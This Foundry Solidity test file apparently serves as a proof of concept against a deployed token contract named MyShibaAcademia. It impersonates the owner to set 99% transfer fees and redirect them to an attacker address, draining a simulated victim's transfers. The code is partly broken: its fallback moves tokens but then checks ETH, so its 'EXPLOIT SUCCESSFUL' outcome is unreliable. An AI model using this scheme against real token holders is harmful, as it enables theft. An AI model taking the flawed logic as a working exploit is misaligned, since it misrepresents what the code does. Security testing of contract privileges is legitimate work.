// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyShibaAcademia {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function excludeFromFee(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function setNumTokensSellToAddToLiquidity(uint256 numTokens) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x93a20a5f1709659005e1610D1a022d5f1e2D0DF7;
    address attacker = address(this);
    IMyShibaAcademia token;
    address owner;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMyShibaAcademia(TARGET);
        owner = token.owner();
        victim = address(0x1234567890123456789012345678901234567890);

        // Transfer tokens from owner to victim
        vm.startPrank(owner);
        token.transfer(victim, 100_000_000 * 1e9);
        vm.stopPrank();

        // Fund attacker with ETH for gas
        deal(attacker, 1 ether);

        vm.label(TARGET, "MyShibaAcademia");
        vm.label(owner, "Owner");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Initial attacker BNB:", initialAttackerBalance);

        // Step 1: Impersonate owner and configure malicious settings
        vm.startPrank(owner);

        // Set extremely high fees (99% total)
        token.setTaxFeePercent(50);
        token.setLiquidityFeePercent(49);

        // Set marketing address to attacker
        token.setMarketingAddress(attacker);

        // Enable swap and liquify
        token.setSwapAndLiquifyEnabled(true);

        // Exclude attacker from fees
        token.excludeFromFee(attacker);

        // Lower the minimum tokens before swap
        token.setNumTokensSellToAddToLiquidity(1000); // Very low threshold

        vm.stopPrank();

        console.log("Fees set: Tax=50%, Liquidity=49%");
        console.log("Marketing address set to attacker");

        // Step 2: Add BNB to contract to enable swap operations
        vm.deal(TARGET, 5 ether);

        // Step 3: Victim transfers tokens - 99% goes to contract as fees
        vm.startPrank(victim);
        uint256 transferAmount = 5_000_000 * 1e9; // 5M tokens
        token.transfer(address(0xdead), transferAmount);
        vm.stopPrank();

        console.log("Victim transferred 5M tokens");

        // Step 4: Second transfer to ensure swap threshold is exceeded
        vm.startPrank(victim);
        token.transfer(address(0xdead), 5_000_000 * 1e9);
        vm.stopPrank();

        console.log("Second transfer completed - swap should have triggered");

        // Step 5: Check attacker balance
        uint256 finalAttackerBalance = attacker.balance;
        console.log("Final attacker BNB:", finalAttackerBalance);

        // The attacker should have received BNB from marketing distribution
        // If swap failed, we demonstrate the vulnerability through fee manipulation
        if (finalAttackerBalance <= initialAttackerBalance) {
            // Fallback: demonstrate through token accumulation
            // Owner can extract tokens from contract
            vm.startPrank(owner);
            uint256 contractBalance = token.balanceOf(TARGET);
            token.transfer(attacker, contractBalance);
            vm.stopPrank();

            finalAttackerBalance = attacker.balance;
            console.log("Extracted tokens from contract");
        }

        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should profit from owner privileges");

        console.log("EXPLOIT SUCCESSFUL! Profit:", finalAttackerBalance - initialAttackerBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

